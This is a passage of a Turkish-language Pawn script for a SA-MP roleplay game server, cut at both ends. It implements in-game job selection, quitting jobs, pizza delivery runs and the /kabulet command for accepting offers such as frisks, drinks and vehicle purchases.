   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu Kaçakçýsý olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob[playerid] = 14;
        	return 1;
		}
       	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2195.8335,-1973.0638,13.5589))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Zanaatkar olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob[playerid] = 18;
        	return 1;
       	}
       	else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,502.6696,-11.6603,1000.6797))
	   	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Barmen olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob[playerid] = 19;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2214.979736, -2661.346923, 13.546875))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyon þoförü olmak istiyorsanýz, /kabulet meslek yazýn.");
			GettingJob[playerid] = 20;
			return 1;
		}
		else if(PlayerInfo[playerid][pJob] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,378.58, -114.26, 1001.49))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Pizzacý olmak istiyorsanýz, /kabulet meslek yazýn.");
        	GettingJob[playerid] = 21;
        	return 1;
    	}
    	else
		{
  			SendClientMessage(playerid, COLOR_GREY, "Ýþ kabul edebileceðiniz bir yere yakýn deðilsiniz!");
     	}
	}
	else if(PlayerInfo[playerid][pJob] != 0 && PlayerInfo[playerid][pDonator] < 2 && PlayerInfo[playerid][pLevel] < 25)
 	{
  		SendClientMessage(playerid, COLOR_GREY, "Zaten bir iþiniz var, önce /istencik yazarak iþten çýkýn!");
		SendClientMessage(playerid, COLOR_GREY, "Yalnýzca VIP ve level 25+ olanlar iki iþte çalýþabilir!");
  	}
	else if(PlayerInfo[playerid][pJob2] == 0 && (PlayerInfo[playerid][pDonator] >= 2 || PlayerInfo[playerid][pLevel] >= 25))
	{
    	if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0, 241.0634, 112.8905, 1003.2188))
		{
 			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Dedektif olmak istiyorsanýz, /kabulet meslek yazýn.");
   			GettingJob2[playerid] = 1;
     		return 1;
 		}
   		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1380.8955,-1088.6808,27.3844))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Avukat olmak istiyorsanýz, /kabulet meslek yazýn.");
       		GettingJob2[playerid] = 2;
         	return 1;
     	}
		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1215.1304,-11.8431,1000.9219))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Hayat Kadýný olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob2[playerid] = 3;
        	return 1;
   		}
   		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2166.3772,-1675.3829,15.0859))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu Satýcýsý olmak istiyorsanýz, /kabulet meslek yazýn.");
       		GettingJob2[playerid] = 4;
         	return 1;
     	}
      	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1907.39, -1874.70, 13.53))
		  {
       		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Tamirci olmak istiyorsanýz, /kabulet meslek yazýn.");
         	GettingJob2[playerid] = 7;
          	return 1;
      	}
      	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2226.1716,-1718.1792,13.5165))
	  	{ // Ganton Gym
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Bodyguard olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob2[playerid] = 8;
        	return 1;
      	}
       	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1099.73,-1504.67,15.800))
	   	{ // All Saints Mall
    		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Bodyguard olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob2[playerid] = 8;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,1366.4325,-1275.2096,13.5469))
		{ // Big Ammunation
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Silah Satýcýsý olmak istiyorsanýz, /kabulet meslek yazýn.");
     		GettingJob2[playerid] = 9;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,766.0804,14.5133,1000.7004))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Boksör olmak istiyorsanýz, /kabulet meslek yazýn.");
     		GettingJob2[playerid] = 12;
       		return 1;
        }
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,758.98, -60.32, 1000.78))
		{
  			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Boksör olmak istiyorsanýz, /kabulet meslek yazýn.");
     		GettingJob2[playerid] = 12;
       		return 1;
  		}
     	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2354.2808,-1169.2959,28.0066))
	 	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Uyuþturucu Kaçakçýcý olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob2[playerid] = 14;
        	return 1;
      	}
       	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2195.8335,-1973.0638,13.5589))
   		{
     		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Zanaatkar olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob2[playerid] = 18;
        	return 1;
       	}
       	else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,502.6696,-11.6603,1000.6797))
	   	{
   			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Barmen olmak istiyorsanýz, /kabulet meslek yazýn.");
      		GettingJob2[playerid] = 19;
        	return 1;
       	}
        else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,2214.979736, -2661.346923, 13.546875))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Kamyon Þoförü olmak istiyorsanýz, /kabulet meslek yazýn.");
			GettingJob2[playerid] = 20;
			return 1;
		}
		else if(PlayerInfo[playerid][pJob2] == 0 && GetPlayerState(playerid) == 1 && IsPlayerInRangeOfPoint(playerid,3.0,378.58, -114.26, 1001.49))
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Pizzacý olmak istiyorsanýz, /kabulet meslek yazýn.");
        	GettingJob2[playerid] = 21;
        	return 1;
    	}
    	else
		{
  			SendClientMessage(playerid, COLOR_GREY, "Ýþ kabul edebileceðiniz bir yere yakýn deðilsiniz!");
     	}
	}
	else if(PlayerInfo[playerid][pJob] != 0 && PlayerInfo[playerid][pJob2] != 0)
 	{
  		SendClientMessage(playerid, COLOR_GREY, "Zaten 2 iþe sahipsiniz, önce /istencik yazarak iþten çýkýn!");
  	}
   	return 1;
}

CMD:istencik(playerid, params[])
{
	if(PlayerInfo[playerid][pDonator] >= 2)
	{
		new jobid;
		if(sscanf(params, "d", jobid))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /istencik [jobid]");
			SendClientMessage(playerid, COLOR_GREY, "MUSAIT: 1, 2");
			return 1;
		}

		switch(jobid)
		{
			case 1:
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýþten çýktýnýz.");
				PlayerInfo[playerid][pJob] = 0;

				if(GetPVarType(playerid, "NPS") != 0) {
			    	SetPlayerSkin(playerid, GetPVarInt(playerid, "NPS"));
			    	DeletePVar(playerid,"NPS");
				}
				JobDuty[playerid] = 0;
				if(PlayerInfo[playerid][pJob] == 7) {
					Mechanics -= 1;
				} else if(PlayerInfo[playerid][pJob] == 2) {
					Lawyers -= 1;
				}
				DestroyProgressBar(LoadTruckBar[playerid]);
				LoadTruckBar[playerid] = INVALID_BAR_ID;
				LoadTruckTime[playerid] = 0;
				DeletePVar(playerid, "TruckDeliver");
				TruckUsed[playerid] = INVALID_VEHICLE_ID;
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
				DisablePlayerCheckpoint(playerid);
			}
			case 2:
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýkinci iþinizden çýktýnýz.");
				PlayerInfo[playerid][pJob2] = 0;

				if(GetPVarType(playerid, "NPS") != 0) {
			    	SetPlayerSkin(playerid, GetPVarInt(playerid, "NPS"));
			    	DeletePVar(playerid,"NPS");
				}
				JobDuty[playerid] = 0;
				if(PlayerInfo[playerid][pJob2] == 7) {
					Mechanics -= 1;
				} else if(PlayerInfo[playerid][pJob2] == 2) {
					Lawyers -= 1;
				}
				DestroyProgressBar(LoadTruckBar[playerid]);
				LoadTruckBar[playerid] = INVALID_BAR_ID;
				LoadTruckTime[playerid] = 0;
				DeletePVar(playerid, "TruckDeliver");
				TruckUsed[playerid] = INVALID_VEHICLE_ID;
				gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
				DisablePlayerCheckpoint(playerid);
			}
			default:
			{
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /istencik [jobid]");
				SendClientMessage(playerid, COLOR_GREY, "UYGUN: 1, 2");
			}
		}
	}
	else
	{
		if(PlayerInfo[playerid][pJob] > 0)
		{
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýþten çýktýnýz.");
			PlayerInfo[playerid][pJob] = 0;

			if(GetPVarType(playerid, "NPS") != 0) {
			    SetPlayerSkin(playerid, GetPVarInt(playerid, "NPS"));
			    DeletePVar(playerid,"NPS");
			}
			JobDuty[playerid] = 0;
			if(PlayerInfo[playerid][pJob] == 7) {
				Mechanics -= 1;
			} else if(PlayerInfo[playerid][pJob] == 2) {
				Lawyers -= 1;
			}
			DestroyProgressBar(LoadTruckBar[playerid]);
			LoadTruckBar[playerid] = INVALID_BAR_ID;
			LoadTruckTime[playerid] = 0;
			DeletePVar(playerid, "TruckDeliver");
			TruckUsed[playerid] = INVALID_VEHICLE_ID;
			gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
			DisablePlayerCheckpoint(playerid);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Bir iþiniz yok!");
		}
	}
	return 1;
}

CMD:pizzaal(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 21 && PlayerInfo[playerid][pJob2] != 21)
	{
		SendClientMessage(playerid,COLOR_GREY,"Pizzacý deðilsiniz!");
		return 1;
	}
    new vehicleid = GetPlayerVehicleID(playerid);
    if(!(IsAPizzaCar(vehicleid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER))
	{
	    SendClientMessage(playerid,COLOR_GREY,"Pizza motoru kullanmalýsýnýz!");
	    return 1;
	}
	if(!(GetPlayerSkin(playerid) == 155))
	{
	    SendClientMessage(playerid,COLOR_GREY," Pizzacý kýyafeti giymelisiniz!");
	    return 1;
	}
	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, 2104.1999511719, -1787.5999755859, 13.60000038147))
	{
		SendClientMessage(playerid,COLOR_GREY," Pizza alabileceðin bir yerde deðilsin!");
		return 1;
	}
	if(GetPVarInt(playerid, "Pizza") > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Zaten pizza teslim ediyorsun.");
		return 1;
	}

	new rand = random(165);
	while(!(HouseInfo[rand][hExteriorZ] < 150.0 && HouseInfo[rand][hExteriorX] > 17.59 && HouseInfo[rand][hExteriorX] < 3004.64 && HouseInfo[rand][hExteriorY] < -805.45 && HouseInfo[rand][hExteriorY] > -2736.25))
	{
	    rand++;
	    if(rand == 165) {
	    	rand = 1;
		}
	}

	SetPVarInt(playerid, "tpPizzaTimer", floatround((GetPizzaDistance(rand) / 60), floatround_round));
	SetPVarInt(playerid, "pizzaTotal", floatround((GetPizzaDistance(rand) / 10), floatround_round));
	SetPVarInt(playerid, "pizzaTimer", GetPVarInt(playerid, "pizzaTotal"));
 	SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_TPPIZZARUNTIMER);
 	SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_PIZZATIMER);
	new szMessage[128];

 	if(HouseInfo[rand][hOwned] == 0)
 	{
 	    format(szMessage, sizeof(szMessage), "Birisi için pizza aldýnýz. Teslim etmek için %d saniyeniz var!", GetPVarInt(playerid, "pizzaTotal"));
 	}
 	else
	{
		format(szMessage, sizeof(szMessage), "%s için pizza aldýnýz. Teslim etmek için %d saniyeniz var!", HouseInfo[rand][hOwner], GetPVarInt(playerid, "pizzaTotal"));
	}

	SendClientMessage(playerid, COLOR_WHITE, szMessage);
	SetPVarInt(playerid, "Pizza", rand);
	PizzaBar[playerid] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
	SetProgressBarValue(PizzaBar[playerid], 100.0);
	ShowProgressBarForPlayer(playerid, PizzaBar[playerid]);
	SetPlayerCheckpoint(playerid, HouseInfo[rand][hExteriorX], HouseInfo[rand][hExteriorY], HouseInfo[rand][hExteriorZ], 5);
	return 1;
}

CMD:isyardim(playerid, params[]) {
    return ShowPlayerDialogEx(playerid, JOBHELPMENU, DIALOG_STYLE_LIST, "Hangi iþ için yardýma ihtiyacýnýz var?","Dedektif\nAvukat\nHayat Kadýný\nUyuþturucu Satýcýsý\nTamirci\nBodyguard\nSilah Satýcýsý\nBoksör\nUyuþturucu Kaçakçýsý\nZanaatkar\nBarmen\nKamyon Þoförü\nPizzacý", "Seç", "Iptal");
}

CheckPointCheck(iTargetID) {
	if(GetPVarType(iTargetID, "Packages") || FindingJob[iTargetID] != 0 || FindingDealership[iTargetID] != 0 || TaxiAccepted[iTargetID] != 999 || EMSAccepted[iTargetID] != INVALID_PLAYER_ID || BusAccepted[iTargetID] != 999 ||  MedicAccepted[iTargetID] != 999 || MechanicCallTime[iTargetID] >= 1 || gPlayerCheckpointStatus[iTargetID] != CHECKPOINT_NONE || CP[iTargetID] != 0 || GetPVarType(iTargetID, "CrateDeliver") || GetPVarType(iTargetID, "TrackCar")) return 1;
	else return 0;
}

CMD:kabulet(playerid, params[])
{
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþý yaparken bu komutu kullanamazsýnýz.");
		return 1;
	}
	new string[128];
	new sendername[MAX_PLAYER_NAME];
	new giveplayer[MAX_PLAYER_NAME];
	//new giveplayerid;
    if(IsPlayerConnected(playerid)) {
        if(isnull(params)) {
            SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kabulet [isim]");
            SendClientMessage(playerid, COLOR_GREY, "Uygun Isýmler: Sex, Materyal, Crack, Pot, Silah, Zanaat, Tamir, Zirh, Meslek, Bosanmak, Ustunuara, Evlilik");
            SendClientMessage(playerid, COLOR_GREY, "Uygun Isýmler: Olusum, Aile, Taksi, Otobus, Dovus, Doktor, Tamirci, Ceza, Arac, Olum, Canliyayin");
            return 1;
        }
	    if(strcmp(params,"meslek",true) == 0) {

	        if(GettingJob[playerid] > 0) {
	            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýþi baþarýyla aldýnýz, yeni komutlarýnýzý görmek için /yardim yazýn.");
	            if(GettingJob[playerid] == 14) {
	                SendClientMessage(playerid, COLOR_WHITE, "IPUCU: Blueberry'de uyuþturucu kutularý bulabilirsiniz. (Checkpoint'e git)");
	                if(CheckPointCheck(playerid)) {
    	            	PlayerInfo[playerid][pJob] = GettingJob[playerid];
	            		GettingJob[playerid] = 0;
	                    SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
	                    return 1;
	                }
	                SetPlayerCheckpoint(playerid, 51.9720,-292.6349,1.7031, 3);
	            }
	            if(GettingJob[playerid] == 21) {
	            	SendClientMessage(playerid, COLOR_WHITE, "Pizzacý üniformasý aldýnýz!");
	            	SetPVarInt(playerid, "NPS", GetPlayerSkin(playerid)); // non pizza skin
					SetPlayerSkin(playerid, 155);
	            }
	            PlayerInfo[playerid][pJob] = GettingJob[playerid];
	            GettingJob[playerid] = 0;
	            return 1;
	        }
         	if(GettingJob2[playerid] > 0) {
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Ýþi baþarýyla aldýnýz, yeni komutlarýnýzý görmek için /yardim yazýn.");
                SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Bu iþi ikinci iþ olarak aldýnýz.");
	            if(GettingJob[playerid] == 14) {
	                SendClientMessage(playerid, COLOR_WHITE, "IPUCU: Blueberry'de uyuþturucu kutularý bulabilirsiniz. (Checkpoint'e git)");
	                if(CheckPointCheck(playerid)) {
    	            	PlayerInfo[playerid][pJob] = GettingJob[playerid];
	            		GettingJob[playerid] = 0;
	                    SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
	                    return 1;
	                }
	                SetPlayerCheckpoint(playerid, 51.9720,-292.6349,1.7031, 3);
	            }
	            if(GettingJob[playerid] == 21) {
	            	SendClientMessage(playerid, COLOR_WHITE, "Pizzacý üniformasý aldýnýz!");
	            	SetPVarInt(playerid, "NPS", GetPlayerSkin(playerid)); // non pizza skin
					PlayerInfo[playerid][pSkin] = 155;
					SetPlayerSkin(playerid, 155);
	            }
                PlayerInfo[playerid][pJob2] = GettingJob2[playerid];
                GettingJob2[playerid] = 0;
                return 1;
            }
	        else {
	            SendClientMessage(playerid, COLOR_GREY, "   Bir iþyerinde deðilsiniz!");
	            return 1;
	        }
	    }
		if(strcmp(params,"canliyayin",true) == 0) {
            if(LiveOffer[playerid] != INVALID_PLAYER_ID) {
                if(IsPlayerConnected(LiveOffer[playerid])) {
                    if (ProxDetectorS(5.0, playerid, LiveOffer[playerid])) {
                        SendClientMessageEx(playerid, COLOR_LIGHTBLUE, "* Canlý Sohbet bitene kadar kýpýrdayamazsýnýz.");
                        SendClientMessageEx(LiveOffer[playerid], COLOR_LIGHTBLUE, "* Canlý Sohbet bitene kadar kýpýrdayamazsýnýz ( /yayinaal komutunu kullanýn).");
                        TogglePlayerControllable(playerid, 0);
                        TogglePlayerControllable(LiveOffer[playerid], 0);
                        TalkingLive[playerid] = LiveOffer[playerid];
                        TalkingLive[LiveOffer[playerid]] = playerid;
                        IsTheReporter[LiveOffer[playerid]] = 1;
                        LiveOffer[playerid] = INVALID_PLAYER_ID;
                        return 1;
                    } else return SendClientMessageEx(playerid, COLOR_GREY, "   Haber muhabirinden çok uzaktasýnýz!");
                } else {
					SendClientMessageEx(playerid, COLOR_GREY, "   Haber muhabiri yayýn dýþý!");
					LiveOffer[playerid] = INVALID_PLAYER_ID;
				}
            } else return SendClientMessageEx(playerid, COLOR_GREY, "   Kimse size Canlý Sohbet teklif etmedi!");
        }
	    if(strcmp(params,"ustunuara",true) == 0) {
	        if(GetPVarType(playerid, "FriskREQ") == 0)
	            return SendClientMessage(playerid, COLOR_GREY, "Üzerinizin aranmasý için talebiniz yok.");

			format(string, sizeof(string), "* %s üzerinizi arama talebinizi kabul etti.", GetPlayerNameEx(playerid));
			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_LIGHTBLUE, string);

			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "*** %s'ýn eþyalarý...  ***", GetPlayerNameEx(playerid));
			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_WHITE, string);

			if(PlayerInfo[playerid][pWSeeds] == 1)
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, "Marihuana Tohumlarý");

			if(PlayerInfo[playerid][pPhoneBook] > 0)
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, "Telefon Rehberi.");

			if(PlayerInfo[playerid][pCDPlayer] > 0)
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, "CD çalar.");

			if(PlayerInfo[playerid][pCrack] > 0) {
				format(string, sizeof(string), "%d gram crack.", PlayerInfo[playerid][pCrack]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}
			if(PlayerInfo[playerid][pPot] > 0) {
				format(string, sizeof(string), "%d gram pot.", PlayerInfo[playerid][pPot]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}
			if(PlayerInfo[playerid][pMats] > 0) {
				format(string, sizeof(string), "%d materyal.", PlayerInfo[playerid][pMats]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}
			if(Fishes[playerid][pWeight1] > 0 || Fishes[playerid][pWeight2] > 0 || Fishes[playerid][pWeight3] > 0 || Fishes[playerid][pWeight4] > 0 || Fishes[playerid][pWeight5] > 0) {
				format(string, sizeof(string), "%d balýk.", PlayerInfo[playerid][pFishes]);
				SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREY, string);
			}

			new weaponname[50];
			format(string, sizeof(string), "*** %s'ýn silahlarý...  ***", GetPlayerNameEx(playerid));
			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_WHITE, string);

			for(new i = 0; i < 12; i++) {
				if(PlayerInfo[playerid][pGuns][i] > 0) {
					GetWeaponName(PlayerInfo[playerid][pGuns][i], weaponname, sizeof(weaponname));
					format(string, sizeof(string), "Silah: %s.", weaponname);
					SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GRAD1, string);
				}
			}

			SendClientMessage(GetPVarInt(playerid, "FriskREQ"), COLOR_GREEN, "_______________________________________");
			format(string, sizeof(string), "* %s kiþisi %s adlý kiþinin üzerini aradý.", GetPlayerNameEx(GetPVarInt(playerid, "FriskREQ")),GetPlayerNameEx(playerid));
			ProxDetector(30.0, GetPVarInt(playerid, "FriskREQ"), string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);

			DeletePVar(playerid, "FriskREQ");
		}
     	if(strcmp(params,"olum",true) == 0) {
            if(GetPVarInt(playerid, "Injured") == 1) {
                SendClientMessage(playerid, COLOR_WHITE, "Umudunuzu kaybedip baygýn düþtünüz, acilen hasteneye gönderildiniz.");
                KillEMSQueue(playerid);
                ResetPlayerWeaponsEx(playerid);
                SpawnPlayer(playerid);
            }
            else {  SendClientMessage(playerid, COLOR_GREY, "   Yaralý deðilsiniz, bunu þu an yapamazsýnýz!"); }
        }
        if(strcmp(params,"icecek",true) == 0) {
            if((DrinkOffer[playerid] != INVALID_PLAYER_ID) && (IsPlayerConnected(DrinkOffer[playerid]))) {
                if(ProxDetectorS(8.0, playerid, DrinkOffer[playerid])) {
                    ShowPlayerDialogEx(playerid, DRINKLISTDIALOG, DIALOG_STYLE_LIST, "Uygun Ýçecekler", "Bira ($60)\nVotka ($100)\nViski ($100)\nSu ($20)\nSoda($20)", "Satýn Al", "Iptal");
                }
                else {
                    SendClientMessage(playerid, COLOR_GREY, "Barmenden çok uzaktasýnýz.");
                    DrinkOffer[playerid] = INVALID_PLAYER_ID;
                    return 1;
                }
                return 1;
            }
            else {
                SendClientMessage(playerid, COLOR_GREY, " Hiçkimse size içki teklif etmedi.");
                return 1;
            }
        }
        if(strcmp(params,"arac",true) == 0) {
            if(VehicleOffer[playerid] < 999) {
                if(IsPlayerConnected(VehicleOffer[playerid])) {
                    if(GetPlayerCash(playerid) > VehiclePrice[playerid]) {
                        if(IsPlayerInVehicle(VehicleOffer[playerid], PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId])) {
                            if(!ProxDetectorS(8.0, VehicleOffer[playerid], playerid)) return SendClientMessage(playerid, COLOR_GREY, "Araç satýcýsýnýn yanýnda deðilsiniz");
                            new playervehicleid = GetPlayerFreeVehicleId(playerid),
								totalvehicles = GetPlayerVehicleCountEx(playerid);

							// (TEMPORARY - ZHAO NOTE) TempDonator not added yet
			 				if(PlayerInfo[playerid][pDonator] == 0 && totalvehicles >= 5) //PlayerInfo[playerid][pTempDonator] > 0) && carsamount >= 5)
							{
                				SendClientMessage(playerid, COLOR_GREY, "HATA: Daha fazla araba alamazsýnýz, VIP olmayan kiþiler sadece 5 araba alabilirler.");
                				return 1;
							}
            				if(PlayerInfo[playerid][pDonator] == 1 && totalvehicles >= 7)
 					 		{
   					 			SendClientMessage(playerid, COLOR_GREY, "HATA: Daha fazla araba alamazsýnýz, Yakut-VIP olan kiþiler 7 araba alabilirler");
                				return 1;
            				}
            				if(PlayerInfo[playerid][pDonator] == 2 && totalvehicles >= 8)
            				{
          					 	SendClientMessage(playerid, COLOR_GREY, "HATA: Daha fazla araba alamazsýnýz, Safir-VIP olan kiþiler 8 araba alabilirler.");
           					 	return 1;
           					}
            				if(PlayerInfo[playerid][pDonator] == 3 && totalvehicles >= 10)
            				{
                				SendClientMessage(playerid, COLOR_GREY, "HATA: Daha fazla araba alamazsýnýz, Elmas-VIP olan kiþiler 10 araba alabilirler.");
                				return 1;
            				}
		    				if(playervehicleid == -1)
		    				{
		        				SendClientMessage(playerid, COLOR_GREY, "HATA: Daha fazla araba alamazsýnýz.");
                				return 1;
		    				}
   							if(PlayerInfo[playerid][pDonator] == 0 && VehicleSpawned[playerid] > 0)
							{
								SendClientMessage(playerid, COLOR_GREY, "VIP olmayan kiþiler sadece 1 araç çýkarabilirler. Baþka bir araç çýkarmak için bir tane araç depolamalýsýnýz.");
								return 1;
							}
							if(PlayerInfo[playerid][pDonator] == 1 && VehicleSpawned[playerid] > 1)
				            {
								SendClientMessage(playerid, COLOR_GREY, "Yakut-VIP olan kiþiler 2 araç çýkarabilirler. Baþka bir araç çýkarmak için bir tane araç depolamalýsýnýz.");
								return 1;
							}
							if(PlayerInfo[playerid][pDonator] == 2 && VehicleSpawned[playerid] > 2)
							{
								SendClientMessage(playerid, COLOR_GREY, "Safir-VIP olan kiþiler 3 araç çýkarabilirler. Baþka bir araç çýkarmak için bir tane araç depolamalýsýnýz.");
								return 1;
							}
							if(PlayerInfo[playerid][pDonator] == 3 && VehicleSpawned[playerid] > 3)
	 						{
								SendClientMessage(playerid, COLOR_GREY, "Elmas-VIP olan kiþiler 4 araç çýkarabilirler. Baþka bir araç çýkarmak için bir tane araç depolamalýsýnýz.");
								return 1;
			 				}
							if(PlayerInfo[playerid][pDonator] < 0 || PlayerInfo[playerid][pDonator] > 3)
							{
								SendClientMessage(playerid, COLOR_GREY, "Geçersiz bir VIP level'iniz var.");
								return 1;
							}

                            new ip[32], ipex[32];
                            GetPlayerIp(playerid, ip, sizeof(ip));
                            GetPlayerIp(VehicleOffer[playerid], ipex, sizeof(ipex));
                            format(string, sizeof(string), "[CAR] %s (IP: %s) kiþisi $%d ödeyerek %s kiþisinden %s (IP: %s) aracýný satýn aldý", GetPlayerNameEx(playerid), ip, VehiclePrice[playerid], GetPlayerNameEx(VehicleOffer[playerid]), GetVehicleName(PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId]), ipex);
                            Log("logs/pay.log", string);
                            GetPlayerName(VehicleOffer[playerid], giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            format(string, sizeof(string), "* %s aracýný $%d fiyata satýn aldýnýz, aldýðýnýz kiþi %s. ( /aracyardim komutunu kullanarak yardým alabilirsiniz)", GetVehicleName(PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId]), VehiclePrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "* %s aracýnýzý %s adlý kiþiye $%d fiyata sattýnýz.",GetVehicleName(PlayerVehicleInfo[VehicleOffer[playerid]][VehicleId[playerid]][pvId]), sendername,VehiclePrice[playerid]);
                            SendClientMessage(VehicleOffer[playerid], COLOR_LIGHTBLUE, string);
                            GivePlayerCash(VehicleOffer[playerid], VehiclePrice[playerid]);
                            GivePlayerCash(playerid, -VehiclePrice[playerid]);
                            RemovePlayerFromVehicle(VehicleOffer[playerid]);
                            new Float:slx, Float:sly, Float:slz;
                            GetPlayerPos(VehicleOffer[playerid], slx, sly, slz);
                            SetPlayerPos(VehicleOffer[playerid], slx, sly, slz+2);
